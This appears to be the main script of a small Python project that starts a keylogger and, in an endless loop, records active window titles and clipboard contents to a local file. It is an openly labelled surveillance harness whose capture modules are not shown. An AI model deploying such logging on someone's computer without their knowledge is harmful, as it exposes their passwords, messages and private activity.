########################################################################################################################
#               This is the main.py for this project where the core of the project's code should be.                   #
#               Try to keep the code as modular as possible by separating it into functions and classes.               #
#                                                                                                                      #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Library imports here
import window_info_logger as wilogger
import keystrokes_and_clipboard_logger as kclogger
import csv
import os


# Main code here
def main():
    if os.path.isfile("test.txt"):
        os.remove("test.txt")

    with open('test.csv', 'a+') as f:
        csvreader = csv.reader(f)
        wilogger.initialise_log_file(f)
        kclogger.start_keylogger(f)
        last_window_title = None
        while True:
            active_window_title = wilogger.active_window_title_grabber()
            # Keys logged between lines 22-25 will be lost.
            if active_window_title != last_window_title:
                f.write(f"\nOPENED {active_window_title} \n")
                last_window_title = active_window_title

            kclogger.log_clipboard(f)


if __name__ == '__main__':
    main()
